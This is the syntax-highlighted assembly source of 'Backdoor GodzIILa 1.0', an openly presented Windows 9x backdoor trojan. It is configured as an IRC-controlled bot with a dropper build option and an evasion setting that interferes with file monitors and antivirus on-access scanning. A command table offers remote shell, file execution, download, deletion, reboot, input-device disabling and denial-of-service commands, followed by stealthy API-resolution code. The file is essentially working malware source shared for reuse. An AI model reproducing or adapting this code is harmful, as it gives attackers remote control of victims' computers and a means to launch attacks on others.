<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>CRV.ASM</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc3 {
	color: #808080;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">; COMMENT ^</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">;               Backdoor GodzIILa 1.0</span><span class="sc0">
</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; win9x backdoor with some kewl featurez. written in offset-independant way. uses</span><span class="sc0">
</span><span class="sc1">; z0mbie's KME to produce new generations (code is fully functional, but u will </span><span class="sc0">
</span><span class="sc1">; still need to write your own loader. code is pretty much self-explanatory and</span><span class="sc0">
</span><span class="sc1">; well commented. some parts of it were inspired by Ratter's I-worm Anarxy, which</span><span class="sc0">
</span><span class="sc1">; is a masterpiece, but done in a more optimized way. codestyle ripped from z0mbie,</span><span class="sc0">
</span><span class="sc1">; the c00l35t dude on the planet :)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Greets to IIL team members (BoyScout, DownBload, Fr1c, h4z4rd, StYx), AS, NHC team</span><span class="sc0">
</span><span class="sc1">; and everyone participating on forum discussions. </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; Coded by Sunnis (annihilator@inet.hr). Come and visit IIL @ www.ii-labs.tk</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">
</span><span class="sc1">; ^</span><span class="sc0">


                </span><span class="sc5">p586</span><span class="sc0">
                </span><span class="sc5">model</span><span class="sc0"> </span><span class="sc10">flat</span><span class="sc4">,</span><span class="sc0">  </span><span class="sc10">stdcall</span><span class="sc0">
                </span><span class="sc5">locals</span><span class="sc0">  </span><span class="sc5">__</span><span class="sc0">
                </span><span class="sc5">%NOINCL</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">mz.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">pe.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">useful.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">myapis.inc</span><span class="sc0">               
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">razno.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">s2c.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">maplib</span><span class="sc0">\</span><span class="sc5">fioexhdr.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">maplib</span><span class="sc0">\</span><span class="sc5">extrns.inc</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc5">kme</span><span class="sc0">\</span><span class="sc5">kme.inc</span><span class="sc0">

</span><span class="sc1">; flags </span><span class="sc0">

</span><span class="sc1">;CRC32_TEST = 1             ; integrity check via CRC32</span><span class="sc0">
</span><span class="sc1">;TRAP_TEST = 1              ; anti-debug thread: check for a tracer</span><span class="sc0">
</span><span class="sc1">;PENTIUM_TEST = 1           ; check for pentium processor</span><span class="sc0">
</span><span class="sc5">IRC_BOT</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; launch an irc bot</span><span class="sc0">
</span><span class="sc5">IRC_LOG</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; log the irc traffic</span><span class="sc0">
</span><span class="sc1">;LOCALHOST = 1              ; connect to the local host (irc, i used tes/tirc irc server)</span><span class="sc0">
</span><span class="sc5">BUILD_DROPPER</span><span class="sc4">=</span><span class="sc2">1</span><span class="sc0">             </span><span class="sc1">; build a dropper</span><span class="sc0">
</span><span class="sc1">;ANTI_AV=1              ; kill local AV &amp; FW</span><span class="sc0">
</span><span class="sc1">;STEALTH_API=1              ; stealth our registry keys</span><span class="sc0">
</span><span class="sc5">STEALTH_API2</span><span class="sc4">=</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; filemon and some AV an-access monitor fuckup</span><span class="sc0">
</span><span class="sc1">;ANTI_DEBUG=1               ; check for a debugger &amp; preform fuckup</span><span class="sc0">

</span><span class="sc5">INET_THREADZ_COUNT</span><span class="sc0">  </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">   </span><span class="sc1">; just an irc bot for now</span><span class="sc0">
</span><span class="sc5">CODE_CRC32</span><span class="sc0">      </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">CONNECT_PORT</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6667</span><span class="sc0">    </span><span class="sc1">; hybserv on irc.carnet.hr</span><span class="sc0">

                </span><span class="sc9">.data</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

                </span><span class="sc9">.code</span><span class="sc0">
</span><span class="sc5">troj_start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">NUM_DLLZ</span><span class="sc0">        </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">

</span><span class="sc5">bot_password</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0"> 
            </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">whash</span><span class="sc0">           </span><span class="sc4">&lt;</span><span class="sc5">IllegalInstructionLabs_Rock_Da_House</span><span class="sc4">&gt;</span><span class="sc0">      </span><span class="sc1">; default bot password. don't forget to change it! :)</span><span class="sc0">

</span><span class="sc5">operators</span><span class="sc4">:</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">                   </span><span class="sc1">; numba of ops</span><span class="sc0">
            </span><span class="sc5">operator</span><span class="sc0"> </span><span class="sc5">MAX_OPERZ_ALLOWED</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(&lt;&gt;)</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">cmd_dispatch_table</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc5">BUILD_DISPATCH_TABLE</span><span class="sc0"> </span><span class="sc5">login</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">quit</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reconnect</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opme</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">exec</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">version</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">info</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">shell</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">chg_pswd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">send</span><span class="sc0">
            </span><span class="sc5">BUILD_DISPATCH_TABLE</span><span class="sc0"> </span><span class="sc5">del</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">reboot</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ls</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">pwd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">mkdir</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">rmdir</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">move</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">copy</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">spawn</span><span class="sc0">
            </span><span class="sc5">BUILD_DISPATCH_TABLE</span><span class="sc0"> </span><span class="sc5">msgbox</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">cleanclip</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">beep</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">closeaw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opencd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">closecd</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">minaw</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">syskill</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">killkeyb</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">killmouse</span><span class="sc0">
            </span><span class="sc5">BUILD_DISPATCH_TABLE</span><span class="sc0"> </span><span class="sc5">logout</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">download</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">procs</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kill</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">opers</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dos</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">stopdos</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">5</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"PING"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bot_PING_cmd</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">9</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"DCC SEND"</span><span class="sc0">
            </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">bot_recv_cmd</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">start</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">BUILD_DROPPER</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">dropper.asm</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">         </span><span class="sc5">..</span><span class="sc0">\</span><span class="sc9">include</span><span class="sc0">\</span><span class="sc5">console.inc</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; BUILD_DROPPER</span><span class="sc0">
            
</span><span class="sc5">troj_entry</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc5">@SEH_SetupFrame</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc6">jmp</span><span class="sc0">    </span><span class="sc5">troj_exit</span><span class="sc4">&gt;</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">5</span><span class="sc0">
</span><span class="sc5">gdelta</span><span class="sc4">:</span><span class="sc0">         </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">                 </span><span class="sc1">; calculate global delta handle</span><span class="sc0">

</span><span class="sc5">G</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">&lt;-</span><span class="sc5">gdelta</span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">]&gt;</span><span class="sc0">              </span><span class="sc1">; all variables relative to gdelta will be accessed in form of: varname G</span><span class="sc0">

</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">CRC32_TEST</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">__CRC32_prot</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">         </span><span class="sc1">; take ptr to CRC32 protected code</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">troj_end</span><span class="sc4">-</span><span class="sc5">__CRC32_prot</span><span class="sc0">      </span><span class="sc1">; size of code</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CRC32</span><span class="sc0">                   </span><span class="sc1">; calculate CRC32</span><span class="sc0">

            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">02dh</span><span class="sc0">                    </span><span class="sc1">; and compare it...</span><span class="sc0">
</span><span class="sc5">crc32_glob</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc5">CODE_CRC32</span><span class="sc0">
    
</span><span class="sc5">__CRC32_prot</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; (CRC32 == OK) ? CF=0 : CF=1</span><span class="sc0">
            </span><span class="sc6">sbb</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; CF-&gt;ECX</span><span class="sc0">
            </span><span class="sc5">jecxnz</span><span class="sc0">  </span><span class="sc5">troj_exit</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; CRC32_TEST</span><span class="sc0">
            
</span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">PENTIUM_TEST</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; EFLAGS -&gt; ecx</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                </span><span class="sc1">; now in eax</span><span class="sc0">
            </span><span class="sc6">bts</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21</span><span class="sc0">                 </span><span class="sc1">; set ID bit</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">popf</span><span class="sc0">                        </span><span class="sc1">; eax -&gt; EFLAGS</span><span class="sc0">
            </span><span class="sc6">pushf</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; EFLAGS -&gt; eax</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; is it the same?</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">troj_exit</span><span class="sc0">               </span><span class="sc1">; blah, we r on 486-</span><span class="sc0">

            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; eax = 1 for cpuid</span><span class="sc0">
            </span><span class="sc6">cpuid</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">16</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">           </span><span class="sc1">; proc. family r bits 8-11</span><span class="sc0">
            </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">                   </span><span class="sc1">; is it 486?</span><span class="sc0">
            </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">troj_exit</span><span class="sc0">               </span><span class="sc1">; lucky 486 :)</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0"> </span><span class="sc1">; PENTIUM_TEST</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_base</span><span class="sc0">                </span><span class="sc1">; load kernel imagebase</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">kernel</span><span class="sc0"> </span><span class="sc5">G</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; save it</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc5">kernel32</span><span class="sc4">-</span><span class="sc5">kernel</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; add the difference and substract NULL offset</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; save it 4 l8r</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; into first dll record</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; kernel imagebase goes into ebx</span><span class="sc0">
            </span><span class="sc5">gethash</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">LoadLibraryA</span><span class="sc4">&gt;</span><span class="sc0">              </span><span class="sc1">; we need this API to map those dlls into ur own address space</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">hash</span><span class="sc0">                    </span><span class="sc1">; push calculated hash</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_dll_address</span><span class="sc0">            </span><span class="sc1">; and find the damn API</span><span class="sc0">

            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">; esi = LoadLibraryA</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">dll_record</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">        </span><span class="sc1">; lea   edi, [ebp+shlwapi-gdelta] = second dll record, but this 1 produces smaller opcode </span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NUM_DLLZ</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">              </span><span class="sc1">; counter into ebx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">

            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"WINMM"</span><span class="sc0">                 </span><span class="sc1">; TODO: crypt somehow this crap</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"MSVCRT"</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"ADVAPI32"</span><span class="sc0">              </span><span class="sc1">; reverse order</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"WS2_32"</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"WININET"</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">a0001_skip</span><span class="sc0">              </span><span class="sc1">; skip exit routine</span><span class="sc0">

</span><span class="sc5">troj_exit</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc5">@SEH_RemoveFrame</span><span class="sc0">                </span><span class="sc1">; i've put it here so that it can be in the range of those jecxz</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0b8h</span><span class="sc0">
</span><span class="sc5">_dd_ExitThread</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">  </span><span class="sc10">?</span><span class="sc0">           
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc5">a0001_skip</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"USER32"</span><span class="sc0">
            </span><span class="sc5">@pushsz</span><span class="sc0"> </span><span class="sc3">"SHLWAPI"</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; LoadLibraryA</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; save it in dll record</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">9</span><span class="sc4">]</span><span class="sc0">                </span><span class="sc1">; skip unnecessary structure members</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">__1</span><span class="sc0">                 </span><span class="sc1">; decrement counter and loop</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">gdelta</span><span class="sc0">          </span><span class="sc1">; ebx = delta offset</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NUM_DLLZ</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; for all dll records</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; lea   edi, [ebp+kernel32-gdelta]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; we'll need it l8r</span><span class="sc0">
</span><span class="sc5">__rel</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">edi.Hash_table</span><span class="sc4">]</span><span class="sc0">           </span><span class="sc1">; skip Dll_Imagebase</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; to esi as store ptr</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; take a hard-coded value</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; relocate</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; and save it</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; repeat for Address_table</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; relocate</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; and save it</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; skip Api_number</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__rel</span><span class="sc0">                   </span><span class="sc1">; loop for every dll record</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; lea   esi, [ebp+kernel32-gdelta]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc5">NUM_DLLZ</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                 </span><span class="sc1">; all the dlls</span><span class="sc0">

</span><span class="sc5">__dll</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">pusha</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                </span><span class="sc1">; ebx = dll imagebase</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; save ptr to Hash_table</span><span class="sc0">
            </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; take ptr to Address_table</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">                </span><span class="sc1">; in edi</span><span class="sc0">
            </span><span class="sc6">lodsb</span><span class="sc0">
            </span><span class="sc6">movzx</span><span class="sc0">   </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">                 </span><span class="sc1">; Api_number in ecx</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                 </span><span class="sc1">; and restore esi</span><span class="sc0">

</span><span class="sc5">__api</span><span class="sc4">:</span><span class="sc0">          </span><span class="sc6">lodsd</span><span class="sc0">                       </span><span class="sc1">; take APIs hash</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; push it as procedure param.</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">load_dll_address</span><span class="sc0">            </span><span class="sc1">; find its address</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">jecxz</span><span class="sc0">   </span><span class="sc5">troj_exit</span><span class="sc0">               </span><span class="sc1">; exit on error</span><span class="sc0">
            </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">stosd</span><span class="sc0">                       </span><span class="sc1">; save APIs address</span><span class="sc0">
            </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__api</span><span class="sc0">                   </span><span class="sc1">; and loop for all APIs</span><span class="sc0">

            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">esp.Pushad_esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc9">size</span><span class="sc0"> </span><span class="sc5">dll_record</span><span class="sc0">   </span><span class="sc1">; take ptr to next dll record</span><span class="sc0">
            </span><span class="sc6">popa</span><span class="sc0">
